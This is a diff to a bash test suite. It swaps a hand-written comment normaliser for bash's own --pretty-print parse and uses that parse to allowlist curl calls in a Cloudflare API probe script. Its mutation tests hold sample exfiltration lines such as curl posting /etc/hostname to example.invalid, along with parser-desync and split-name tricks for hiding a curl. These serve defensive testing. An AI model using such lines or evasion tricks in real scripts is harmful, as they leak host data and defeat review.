@@ -805,30 +805,34 @@ unset MOCK_LB_POOLS
 # --- D12: read-only source guards on the whole script (extends C10 posture) ---
 src_lacks '(^|[[:space:]])-X[[:space:]]+(POST|PUT|PATCH|DELETE)' "D12 no literal mutating curl verb in source (the write verb comes only from the migration tables)"
 src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
-# --- D12c: curl-invocation ALLOWLIST (fourth revision; #12932 review). ---
-# CONTRACT. The first two revisions listed forbidden write-flag spellings, and each
-# round found one more that passed (-XDELETE -d@/dev/null, -d"$X", -X "DELETE", a
-# second body flag, an "INVALID_BODY" substring in a comment). The third pinned
-# what IS allowed, but trusted its own comment stripper: `echo ${x:- #}; curl …`
-# and `y=a\ #; curl …` both RUN the curl while the normaliser drops it as a
-# comment. This revision adds a raw-text cross-check that does not trust the
-# normaliser's idea of where a comment starts. Over the WHOLE script under test:
-#   (I) after a quote-aware comment strip, backslash-continuation join and
-#       whitespace collapse (D12C_NORM), every logical line naming curl
-#       (case-insensitive) equals, as a multiset, one of the reviewed canonical
-#       forms in D12C_CANON: three executed invocations, five dry-run recipe
-#       strings and the prerequisite loop. A new curl site, an edited one, a
-#       duplicated one or a removed one is RED.
-#   (R) raw cross-check (D12C_RAWCHK). D12C_NORM records the raw line range of
-#       every logical line. Every RAW line whose text contains `curl`
-#       (case-insensitive substring, no word boundary; the closed exempt set is
-#       the two env names CURL_CA_BUNDLE and CURL_HOME the script unsets) must be
-#       either a whole-line comment (`^\s*#`, and the previous raw line does not
-#       end in `\`) or one of the raw lines of a logical line whose normalised
-#       text is EXACTLY a D12C_CANON entry. Any other raw curl line is RED, so a
-#       normaliser desync that hides a curl as a comment reds here.
-#   (S) the same cross-check on a copy with every ' " and \ deleted, which
-#       catches a name split by quotes or a backslash (`cu""rl`, `cur\l`).
+# --- D12c: curl-invocation ALLOWLIST over bash's own parse (fifth revision; #12932 review). ---
+# CONTRACT. Revisions 1-2 listed forbidden write-flag spellings, and each round
+# found one more that passed (-XDELETE -d@/dev/null, -d"$X", -X "DELETE", a second
+# body flag, an "INVALID_BODY" substring in a comment). Revisions 3-4 pinned what
+# IS allowed, but read the script through a hand-written awk comment and quote
+# normaliser, and every round found a construct that the normaliser and bash read
+# differently (`${x:- #}`, `a\ #`, a continued `#`, then ANSI-C `x=$'\''`): bash
+# RAN the curl while the normaliser saw a comment. This revision has no parser of
+# its own. It reads the script through `bash --pretty-print` (bash >= 5.2), which
+# parses the file WITHOUT executing it and prints the parse: comments dropped,
+# continuations joined, command and process substitutions re-printed from their
+# own parse. The parser that prints is the parser that runs the script, so what
+# it drops as a comment is a comment. Over the WHOLE script under test:
+#   (P) `env -i PATH=/var/empty "$BASHBIN" --pretty-print "$SUT"` exits 0, and
+#       the bash is >= 5.2. A parse error, an older bash or a bash without the
+#       option is RED, never a skip. Bash prints the parse up to a syntax error
+#       before it fails, so the exit code is the only signal that it stopped
+#       early: a payload after the error would otherwise leave (I) green.
+#   (I) every printed line naming curl (case-insensitive substring: no word
+#       boundary and no exempt names), whitespace-trimmed, equals D12C_CANON as
+#       a multiset: three executed invocations, five dry-run recipe strings, the
+#       prerequisite loop and the env unset. A new curl site, an edited one, a
+#       duplicated one or a removed one is RED. So is a curl appended to a line
+#       that holds a canonical form: pretty-print prints a list on one line, so
+#       that line no longer equals its canonical form.
+#   (S) the same, with every ' " and \ deleted from both sides. Bash prints a
+#       word as written, so a name split by quotes or a backslash (`cu""rl`,
+#       `cur\l`) says curl only in the stripped copy.
 #   (F) a LINT of D12C_CANON, not an independent check of the script: every
 #       canonical form uses only the read flags --disable --noproxy -sS
 #       --max-time -w -H, plus -X and --data-binary as a PAIR: -X takes only the
@@ -838,52 +842,35 @@ src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
 #       applied to a copy of D12C_CANON.
 #   (U) the curl mock refuses any flag it does not model (logs UNMODELLED, exit
 #       64), and U1 at the end of the suite asserts no run in this file hit that.
-# RESIDUALS, left to review:
-#   - a curl name split at parse time by something other than ' " \ (`c${e}url`,
-#     `c$()url`, `$'\x63'url`); (S) covers only the quote and backslash shapes;
+# WHAT (I) AND (S) QUANTIFY OVER: every command bash parses from the file, at any
+# nesting (function bodies, compound commands, command and process
+# substitutions), after bash itself has removed comments and continuations. A
+# curl that the file can run without building its name at run time is on a
+# printed line. No comment, quote or continuation shape is left to desync,
+# because there is no second parser to desync from.
+# RESIDUALS, left to review (what --pretty-print does not see):
+#   - a name built at run time: indirection or concatenation (`c=cu; "${c}rl"`,
+#     `c${e}url`, `c$()url`), `$'\x63'url`, eval of a string, a variable that
+#     assembles the command. The parse holds the expansion, not its value, and
+#     (S) strips only ' " \;
+#   - text that is data to this parse and code to another: a heredoc or string
+#     fed to an interpreter, a sourced file, a second script. A heredoc body is
+#     printed verbatim, so a curl there reds (I) unless it replaces a canonical
+#     line exactly;
 #   - non-curl HTTP clients (wget, nc, /dev/tcp, a python/node/perl runtime);
-#   - curl reached indirectly: a name assembled at run time, eval of a string,
-#     a variable holding the command, a sourced file, a second script or a
-#     heredoc fed to an interpreter (a heredoc is inventoried line by line only);
-#   - a desync that turns a raw curl line into part of a logical line whose
-#     normalised text is EXACTLY a canonical form (the range is then trusted);
 #   - the VALUES of $method and $INVALID_BODY (pinned by D12, M0, M1 and the
 #     SUT's own table tripwire, not here); curl behaviour from outside argv (the
 #     canonical forms carry --disable and --noproxy '*', nothing more); and
 #     whether a canonical form is itself safe, which is the review that accepted
 #     it into D12C_CANON. Changing D12C_CANON is a reviewed act, not a refresh.
-D12C_NORM="$WORK/d12c-norm.awk"
-cat >"$D12C_NORM" <<'AWK'
-function top() { return d ? st[d] : "" }
-function flush() { gsub(/[ \t]+/, " ", buf); sub(/^ /, "", buf); sub(/ $/, "", buf); if (buf != "") print start "\t" NR "\t" buf; buf = ""; start = 0 }
-hd != "" { if ($0 ~ ("^\t*" hd "$")) { hd = ""; next } x = $0; gsub(/[ \t]+/, " ", x); print NR "\t" NR "\theredoc: " x; next }
-{
-  line = $0; out = ""; n = length(line); i = 1; cont = 0
-  if (start == 0) start = NR
-  while (i <= n) {
-    c = substr(line, i, 1); t = top()
-    if (t == "sq") { out = out c; if (c == "'") d--; i++; continue }
-    if (c == "\\") { if (i == n) { cont = 1; i++; continue } out = out c substr(line, i + 1, 1); i += 2; continue }
-    if (c == "$" && substr(line, i + 1, 1) == "(") { st[++d] = "cs"; out = out "$("; i += 2; continue }
-    if (t == "dq") { out = out c; if (c == "\"") d--; i++; continue }
-    if (c == "'") { st[++d] = "sq"; out = out c; i++; continue }
-    if (c == "\"") { st[++d] = "dq"; out = out c; i++; continue }
-    if (c == "(") { st[++d] = "cs"; out = out c; i++; continue }
-    if (c == ")") { if (t == "cs") d--; out = out c; i++; continue }
-    if (c == "#" && (i == 1 || substr(line, i - 1, 1) ~ /[ \t;|&(]/)) break
-    out = out c; i++
-  }
-  buf = buf out " "
-  if (cont || d > 0) next
-  if (match(buf, /(^|[^<])<<-?[ ]*['"]?[A-Za-z_][A-Za-z0-9_]*['"]?/)) { h = substr(buf, RSTART, RLENGTH); sub(/^[^<]*<<-?[ ]*['"]?/, "", h); sub(/['"]$/, "", h); hd = h }
-  flush()
-}
-END { if (d > 0 || hd != "" || buf != "") print "0\t0\tPARSE-ERROR unbalanced quote/substitution/heredoc at EOF" }
-AWK
-# The flag allowlist (F). Input: one logical line per row. Prints each offending row.
+#     Its lines are bash's own printing of the reviewed source (measured equal on
+#     bash 5.2.21, Ubuntu 24.04, and 5.3.20), so a printing change in a future
+#     bash reds (I) and is reviewed, never silently admitted.
+# The flag allowlist (F). Input: one canonical line per row. Prints each offending row.
 D12C_FLAGS="$WORK/d12c-flags.awk"
 cat >"$D12C_FLAGS" <<'AWK'
-$0 == "for bin in curl doppler jq; do" { next }
+$0 == "for bin in curl doppler jq;" { next }
+$0 ~ /^unset [A-Z_ ]+$/ { next }
 {
   s = $0; p = match(tolower(s), /curl/); if (!p) { print "no-curl-word: " $0; next }
   s = substr(s, p + 4); gsub(/\\"/, "\"", s); gsub(/\\\$/, "$", s)
@@ -899,131 +886,101 @@ $0 == "for bin in curl doppler jq; do" { next }
   if (bad != "") print bad " :: " $0
 }
 AWK
+# D12C_CANON: the reviewed curl-naming lines of `bash --pretty-print "$SUT"`, trimmed.
 D12C_CANON="$WORK/d12c-canon.txt"
 cat >"$D12C_CANON" <<'CANON'
-printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$c_key")\") $(mig_url "$c_url")"
-printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -X $w_method -H 'Content-Type: application/json' --data-binary \"\$INVALID_BODY\" -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$w_key")\") $(mig_url "$w_url")"
-printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $r_url"
-printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/zones/\$ZONE/rulesets/phases/$p/entrypoint"
-printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/accounts/\$ACCT/rulesets"
-for bin in curl doppler jq; do
-resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "$TOK") "$url" 2>/dev/null || true)"
-resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2>/dev/null || true)" ;;
-resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -X "$method" -H 'Content-Type: application/json' --data-binary "$INVALID_BODY" -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2>/dev/null || true)" ;;
+unset SSLKEYLOGFILE CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME HOSTALIASES LOCALDOMAIN RES_OPTIONS
+[[ -n "$c_label" ]] || continue; printf '%s\n' "# control $c_label (want 200, success:true, .result $c_want)"; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$c_key")\") $(mig_url "$c_url")";
+printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -X $w_method -H 'Content-Type: application/json' --data-binary \"\$INVALID_BODY\" -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$w_key")\") $(mig_url "$w_url")";
+IFS='|' read -r r_class r_label r_url r_want r_scheme <<< "$row"; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $r_url";
+printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/zones/\$ZONE/rulesets/phases/$p/entrypoint";
+done; printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/accounts/\$ACCT/rulesets"; exit 0;
+for bin in curl doppler jq;
+resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "$TOK") "$url" 2> /dev/null || true)";
+resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
+resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -X "$method" -H 'Content-Type: application/json' --data-binary "$INVALID_BODY" -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2> /dev/null || true)"
 CANON
-# The raw cross-check (R/S). Input files: ranges ("start end" per canonical logical
-# line), then the raw script. -v strip=1 deletes ' " \ before the curl match.
-D12C_RAWCHK="$WORK/d12c-rawchk.awk"
-cat >"$D12C_RAWCHK" <<'AWK'
-FILENAME == ARGV[1] { for (k = $1; k <= $2; k++) cov[k] = 1; next }
-{
-  pc = prevc; com = ($0 ~ /^[ \t]*#/) && !pc; prevc = !com && ($0 ~ /\\$/)
-  s = $0; if (strip) gsub(/['"\\]/, "", s)
-  gsub(/(^|[^A-Za-z0-9_])CURL_(CA_BUNDLE|HOME)([^A-Za-z0-9_]|$)/, " ", s)
-  if (tolower(s) !~ /curl/ || com || (FNR in cov)) next
-  print FNR ": " $0
-}
-AWK
-# d12c_curl_lines <script> <out>: the normalised logical lines that name curl.
-d12c_curl_lines() {
-  awk -f "$D12C_NORM" "$1" >"$2.all"
-  grep -iE -- '(^|[^A-Za-z0-9_.-])curl([^A-Za-z0-9_.-]|$)|PARSE-ERROR' "$2.all" | cut -f3- >"$2" || true
-}
-# d12c_inventory <script>: prints nothing when the curl lines equal D12C_CANON as a multiset.
-d12c_inventory() {
-  local o="$WORK/d12c-inv.$RANDOM"
-  d12c_curl_lines "$1" "$o"
-  sort "$o" >"$o.s"; sort "$D12C_CANON" >"$o.c"
-  diff "$o.c" "$o.s" >"$o.d" || cat "$o.d"
-}
-# d12c_raw <script> <strip 0|1>: prints each raw curl line no canonical range covers.
-d12c_raw() {
-  local o="$WORK/d12c-raw.$RANDOM"
-  awk -f "$D12C_NORM" "$1" >"$o.all"
-  awk -F'\t' 'FILENAME == ARGV[1] { canon[$0] = 1; next } { t = $0; sub(/^[^\t]*\t[^\t]*\t/, "", t); if (t in canon) print $1, $2 }' "$D12C_CANON" "$o.all" >"$o.rng"
-  awk -v strip="$2" -f "$D12C_RAWCHK" "$o.rng" "$1"
+# d12c_check <script> <I|S> [bash]: prints nothing when the curl-naming lines of
+# bash's parse of <script> equal D12C_CANON as a multiset (S: both sides with every
+# ' " \ deleted). A non-zero --pretty-print exit prints "PARSE rc=<n>: <stderr>".
+d12c_check() {
+  local o="$WORK/d12c-chk.$RANDOM" rc=0
+  env -i PATH=/var/empty "${3:-$BASHBIN}" --pretty-print "$1" >"$o.pp" 2>"$o.err" || rc=$?
+  if [[ "$rc" != 0 ]]; then printf 'PARSE rc=%s: %s\n' "$rc" "$(head -c 300 "$o.err")"; return; fi
+  if [[ "$2" == S ]]; then
+    tr -d "'\"\\\\" <"$o.pp" >"$o.x"; tr -d "'\"\\\\" <"$D12C_CANON" >"$o.c"
+  else
+    cp "$o.pp" "$o.x"; cp "$D12C_CANON" "$o.c"
+  fi
+  awk '{ sub(/^[ \t]+/, ""); sub(/[ \t]+$/, "") } tolower($0) ~ /curl/' "$o.x" | LC_ALL=C sort >"$o.s"
+  LC_ALL=C sort "$o.c" >"$o.cs"
+  diff "$o.cs" "$o.s" >"$o.d" || cat "$o.d"
 }
 
-# Positive controls: the normaliser strips a comment that names curl, keeps a '#'
-# inside quotes, joins a continuation, and reports an unbalanced quote.
-cat >"$WORK/d12c-synth.sh" <<'SYNTH'
-# curl -d @/etc/passwd https://x  (comment: must vanish)
-r="$(curl --disable -sS \
-  -H 'X: #not-a-comment' "$u" 2>/dev/null || true)"  # trailing comment
-SYNTH
-d12c_curl_lines "$WORK/d12c-synth.sh" "$WORK/d12c-synth.out"
-# shellcheck disable=SC2016  # the literal normalised text is the assertion
-if [[ "$(cat "$WORK/d12c-synth.out")" == 'r="$(curl --disable -sS -H '"'"'X: #not-a-comment'"'"' "$u" 2>/dev/null || true)"' ]]; then
-  ok "D12c positive control: normaliser strips comments, keeps a quoted #, joins a continuation"
+# shellcheck disable=SC2016  # the child bash expands these, not this one
+if "$BASHBIN" -c '(( BASH_VERSINFO[0] > 5 || (BASH_VERSINFO[0] == 5 && BASH_VERSINFO[1] >= 2) ))'; then
+  ok "D12c (P) $BASHBIN is bash >= 5.2 ($("$BASHBIN" -c 'printf %s "$BASH_VERSION"')), the --pretty-print this block reads through"
 else
-  no "D12c normaliser control: got [$(cat "$WORK/d12c-synth.out")]"
+  no "D12c (P) $BASHBIN is older than bash 5.2: --pretty-print is unavailable or prints a different parse (RED, never a skip)"
 fi
-if grep -qxF -- "$(printf '2\t3\t')$(cat "$WORK/d12c-synth.out")" "$WORK/d12c-synth.out.all"; then
-  ok "D12c positive control: the normaliser maps a joined logical line back to its raw range (2-3)"
-else
-  no "D12c normaliser lost the raw range: [$(cat "$WORK/d12c-synth.out.all")]"
-fi
-printf '%s\n' "x='unclosed" >"$WORK/d12c-unbal.sh"
-d12c_curl_lines "$WORK/d12c-unbal.sh" "$WORK/d12c-unbal.out"
-if grep -qF -- 'PARSE-ERROR' "$WORK/d12c-unbal.out"; then ok "D12c positive control: an unbalanced quote is a parse error, never a silent pass"; else no "D12c normaliser accepted an unbalanced quote"; fi
-d12c_curl_lines "$SUT" "$WORK/d12c-sut.txt"
-assert_eq "D12c the script names curl on exactly the 9 reviewed logical lines" 9 "$(wc -l <"$WORK/d12c-sut.txt" | tr -d '[:space:]')"
-# shellcheck disable=SC2016  # literal source text is the assertion
-assert_eq "D12c three of them are executed invocations (\$(curl ...)" 3 "$(grep -cF -- '$(curl ' "$WORK/d12c-sut.txt" || true)"
-d12c_inv_out="$(d12c_inventory "$SUT")"
-if [[ -z "$d12c_inv_out" ]]; then ok "D12c (I) every curl line in source is a reviewed canonical form"; else no "D12c (I) curl lines differ from D12C_CANON: $d12c_inv_out"; fi
-d12c_raw_out="$(d12c_raw "$SUT" 0)"
-if [[ -z "$d12c_raw_out" ]]; then ok "D12c (R) every raw curl line is a whole-line comment or part of a canonical logical line"; else no "D12c (R) raw curl lines outside every canonical range: $d12c_raw_out"; fi
-d12c_raw_out="$(d12c_raw "$SUT" 1)"
-if [[ -z "$d12c_raw_out" ]]; then ok "D12c (S) the same holds with every ' \" \\ deleted (no quote-split curl name)"; else no "D12c (S) quote-stripped curl lines outside every canonical range: $d12c_raw_out"; fi
+d12c_out="$(d12c_check "$SUT" I)"
+if [[ -z "$d12c_out" ]]; then ok "D12c (P+I) bash parses the script, and every curl-naming line of the parse is a reviewed canonical form"; else no "D12c (P+I) parse failed or curl lines differ from D12C_CANON: $d12c_out"; fi
+d12c_out="$(d12c_check "$SUT" S)"
+if [[ -z "$d12c_out" ]]; then ok "D12c (S) the same holds with every ' \" \\ deleted (no quote-split curl name)"; else no "D12c (S) quote-stripped curl lines differ from D12C_CANON: $d12c_out"; fi
 d12c_fl_canon="$(awk -f "$D12C_FLAGS" "$D12C_CANON")"
 if [[ -z "$d12c_fl_canon" ]]; then ok "D12c (F) the canonical forms pass the flag allowlist"; else no "D12c (F) a canonical form breaks the allowlist: $d12c_fl_canon"; fi
 # shellcheck disable=SC2016  # literal source text is the assertion
 assert_eq "D12c the run path sends INVALID_BODY from exactly one curl site" 1 "$(grep -cF -- '--data-binary "$INVALID_BODY"' "$SUT" || true)"
 
-# Mutants of the SCRIPT, each applied to a temp COPY (never the live tree). The
-# layer letters name what each mutant must red: I inventory, R raw cross-check,
-# S stripped cross-check. A layer is asserted only where it can fail on its own
-# (S is a superset of R, so a mutant that reds R does not also assert S).
+# Mutants of the SCRIPT, each applied to a temp COPY (never the live tree) and
+# never executed. Each row asserts the layer that must red it, for its own reason:
+# I = the parse succeeds and its curl lines differ from the canon; S = the same on
+# the stripped copy; P = --pretty-print exits non-zero.
 # shellcheck disable=SC2016  # literal source text is the assertion
 D12C_WRITE_ANCHOR='--data-binary "$INVALID_BODY"'
 D12C_GET_ANCHOR="-sS --max-time 15 -w '\n%{http_code}' \\"
-# d12c_mut <layers> <label> <anchor> <replacement> | <layers> <label> APPEND <line>
+D12C_FN_ANCHOR=$'    *)             printf \'\' ;;\n  esac\n'
+# d12c_mut <layer I|S|P> <label> <anchor> <replacement> | <layer> <label> APPEND <line>
 d12c_mut() {
-  local layers="$1" label="$2" anchor="$3" repl="$4" src copy="$WORK/d12c-mut.sh"
+  local layer="$1" label="$2" anchor="$3" repl="$4" src copy="$WORK/d12c-mut.sh" out
   src="$(cat "$SUT")"
   if [[ "$anchor" == APPEND ]]; then src+=$'\n'"$repl"; else
     [[ "$src" == *"$anchor"* ]] || { no "MUT D12c $label: anchor not found in source (mutant is vacuous)"; return; }
     src="${src/"$anchor"/"$repl"}"
   fi
   printf '%s\n' "$src" >"$copy"
-  if [[ "$layers" == *I* ]]; then
-    if [[ -n "$(d12c_inventory "$copy")" ]]; then ok "MUT D12c $label reds the canonical inventory (I)"; else no "MUT D12c $label survives the canonical inventory (I)"; fi
-  fi
-  if [[ "$layers" == *R* ]]; then
-    if [[ -n "$(d12c_raw "$copy" 0)" ]]; then ok "MUT D12c $label reds the raw cross-check (R)"; else no "MUT D12c $label survives the raw cross-check (R)"; fi
-  fi
-  if [[ "$layers" == *S* ]]; then
-    if [[ -n "$(d12c_raw "$copy" 1)" ]]; then ok "MUT D12c $label reds the stripped cross-check (S)"; else no "MUT D12c $label survives the stripped cross-check (S)"; fi
-  fi
+  case "$layer" in
+    P) out="$(d12c_check "$copy" I)"
+       if [[ "$out" == "PARSE rc="* ]]; then ok "MUT D12c $label reds the parse (P)"; else no "MUT D12c $label survives the parse (P): [$out]"; fi ;;
+    *) out="$(d12c_check "$copy" "$layer")"
+       if [[ -n "$out" && "$out" != "PARSE rc="* ]]; then ok "MUT D12c $label reds ($layer)"; else no "MUT D12c $label survives ($layer), or reds for another reason: [$out]"; fi ;;
+  esac
 }
 # shellcheck disable=SC2016  # literal source text is the mutation
 {
-d12c_mut IR '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
-d12c_mut IR '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
-d12c_mut IR 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
-d12c_mut IR '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
-d12c_mut IR '-XDELETE on a read probe (no body)' "$D12C_GET_ANCHOR" "-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"
-d12c_mut IR 'a new curl line hiding behind "# INVALID_BODY"' APPEND 'curl -sS -d @/etc/hostname https://example.invalid # INVALID_BODY'
-# Parser-desync probes: bash RUNS each curl, the normaliser reads it as a comment,
-# so (I) cannot see it and the raw cross-check must.
-d12c_mut R 'desync: curl after "${x:- #}" (the # is inside the expansion)' APPEND 'echo ${x:- #}; curl -sS -d @/etc/hostname https://example.invalid'
-d12c_mut R 'desync: curl after an escaped space "a\ #" (the # is mid-word)' APPEND 'y=a\ #; curl -sS -d @/etc/hostname https://example.invalid'
-d12c_mut R 'desync: curl on a "#" line continued from "a\" (the # is mid-word)' APPEND $'echo a\\\n#; curl -sS -d @/etc/hostname https://example.invalid'
-# Names split by quotes or a backslash: no raw line says "curl", so only (S) sees them.
+d12c_mut I '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
+d12c_mut I '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
+d12c_mut I 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
+d12c_mut I '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
+d12c_mut I '-XDELETE on a read probe (no body)' "$D12C_GET_ANCHOR" "-sS -XDELETE --max-time 15 -w '\n%{http_code}' \\"
+d12c_mut I 'a new curl line hiding behind "# INVALID_BODY"' APPEND 'curl -sS -d @/etc/hostname https://example.invalid # INVALID_BODY'
+# The payload that beat revision 4 (test-design seat, fr3 F1): bash leaves the
+# ANSI-C string after `$'\''`, so the '# ' line is live code and runs the curl.
+d12c_mut I 'ANSI-C quoting: curl on a "#" line that bash runs' APPEND $'x=$\'\\\'\'\ny=\'\n# \'; curl --disable -sS -d @/etc/hostname https://example.invalid'
+d12c_mut I 'a continuation-split -XDE\<newline>LETE on a read probe' "$D12C_GET_ANCHOR" $'-sS -XDE\\\nLETE --max-time 15 -w \'\\n%{http_code}\' \\'
+d12c_mut I '"}"-escape: a function body closed early, a top-level curl, a new function' "$D12C_FN_ANCHOR" "$D12C_FN_ANCHOR"$'}\n/usr/bin/curl -sS -d @/etc/hostname https://example.invalid\n__w() { :\n'
+# Names split by quotes or a backslash: bash prints the word as written, so only (S) sees them.
 d12c_mut S 'split name cu""rl' APPEND 'cu""rl -sS -d @/etc/hostname https://example.invalid'
 d12c_mut S 'split name cur\l' APPEND 'cur\l -sS -d @/etc/hostname https://example.invalid'
+# A parse error after the last canonical line: bash has already printed every
+# canonical line, so only the exit code tells the parse stopped.
+d12c_mut P 'a stray "}" / curl / "__w() { :" at top level (syntax error)' APPEND $'}\n/usr/bin/curl -sS -d @/etc/hostname https://example.invalid\n__w() { :'
 }
+# (P) a bash without --pretty-print (a 5.1-or-older stand-in that rejects the option) is RED.
+printf '%s\n' '#!/bin/sh' 'echo "bash: --pretty-print: invalid option" >&2; exit 2' >"$WORK/bash-no-pp"
+chmod +x "$WORK/bash-no-pp"
+d12c_out="$(d12c_check "$SUT" I "$WORK/bash-no-pp")"
+if [[ "$d12c_out" == "PARSE rc=2: "* ]]; then ok "MUT D12c (P) a bash that rejects --pretty-print reds, never skips"; else no "MUT D12c (P) a bash without --pretty-print was not RED: [$d12c_out]"; fi
 # Mutants of D12C_CANON for the (F) lint: a "reviewed" canon refresh that admits a
 # write flag must red (F). Applied to a temp copy of the canon.
 # d12c_fmut <label> <anchor> <replacement> | <label> APPEND <line>
@@ -1040,24 +997,22 @@ d12c_fmut() {
 # shellcheck disable=SC2016  # literal canon text is the mutation
 {
 d12c_fmut '-XDELETE -d@/dev/null on the write probe' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -XDELETE -d@/dev/null"
-d12c_fmut '-d"$X" beside the invalid body' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR -d\"\$X\""
-d12c_fmut 'a second body flag (--data-raw "$INVALID_BODY_V2")' "$D12C_WRITE_ANCHOR" "$D12C_WRITE_ANCHOR --data-raw \"\$INVALID_BODY_V2\""
-d12c_fmut '-X "DELETE" in place of the table method' '-X "$method"' '-X "DELETE"'
-d12c_fmut '-XDELETE on a read probe (no body)' '-sS --max-time 15 -w' '-sS -XDELETE --max-time 15 -w'
 d12c_fmut 'a new curl line with -d @/etc/hostname' APPEND 'curl -sS -d @/etc/hostname https://example.invalid'
 }
-# Non-curl lines that tripped the old spelling list (grep -qF, sort -T, [[ -d) stay green.
+# Negative controls: a non-curl line that tripped the old spelling list (grep -qF,
+# sort -T, [[ -d) and a whole-line comment naming curl (bash drops it) stay green.
 printf '%s\n%s\n' "$(cat "$SUT")" '[[ -d /tmp ]] && sort -T /tmp </dev/null >/dev/null; grep -qF -- x /dev/null || true' >"$WORK/d12c-mut.sh"
-if [[ -z "$(d12c_inventory "$WORK/d12c-mut.sh")$(d12c_raw "$WORK/d12c-mut.sh" 0)$(d12c_raw "$WORK/d12c-mut.sh" 1)" ]]; then
-  ok "D12c negative control: non-curl -d/-T/-F lines do not false-match (I, R, S)"
+if [[ -z "$(d12c_check "$WORK/d12c-mut.sh" I)$(d12c_check "$WORK/d12c-mut.sh" S)" ]]; then
+  ok "D12c negative control: non-curl -d/-T/-F lines do not false-match (I, S)"
 else
   no "D12c a non-curl line false-matched the allowlist"
 fi
-# (R) exempts a whole-line comment and the closed env-name set; neither may widen.
 printf '%s\n%s\n' "$(cat "$SUT")" '  # a comment that names curl -d @/etc/hostname' >"$WORK/d12c-mut.sh"
-if [[ -z "$(d12c_raw "$WORK/d12c-mut.sh" 0)" ]]; then ok "D12c (R) negative control: an appended whole-line comment naming curl stays green"; else no "D12c (R) false-red a whole-line comment"; fi
-printf '%s\n%s\n' "$(cat "$SUT")" 'CURL_HOME=/x curl -sS https://example.invalid' >"$WORK/d12c-mut.sh"
-if [[ -n "$(d12c_raw "$WORK/d12c-mut.sh" 0)" ]]; then ok "MUT D12c (R) a curl beside an exempt env name (CURL_HOME=/x curl) still reds"; else no "MUT D12c (R) the CURL_HOME exemption hid a curl"; fi
+if [[ -z "$(d12c_check "$WORK/d12c-mut.sh" I)$(d12c_check "$WORK/d12c-mut.sh" S)" ]]; then
+  ok "D12c negative control: a whole-line comment naming curl stays green (bash's parse drops it)"
+else
+  no "D12c a comment naming curl false-matched (I/S)"
+fi
 # (U) the mock refuses an unmodelled flag rather than answering it as a GET.
 D12C_ULOG="$WORK/d12c-unmodelled.log"; : >"$D12C_ULOG"
 PATH="$MOCKPATH" MOCK_CURL_UNMODELLED="$D12C_ULOG" "$MOCKBIN/curl" -sS -XDELETE https://api.cloudflare.com/client/v4/x >"$OUTFILE" 2>&1
@@ -1268,7 +1223,7 @@ else
 fi
 
 printf '\n%d passed, %d failed\n' "$pass" "$fail"
-MIN_ASSERTIONS=334
+MIN_ASSERTIONS=320
 if [[ "$((pass + fail))" -lt "$MIN_ASSERTIONS" ]]; then
   printf 'ANTI-VACUITY FLOOR: only %s assertions ran, floor is %s\n' "$((pass + fail))" "$MIN_ASSERTIONS" >&2
   exit 1
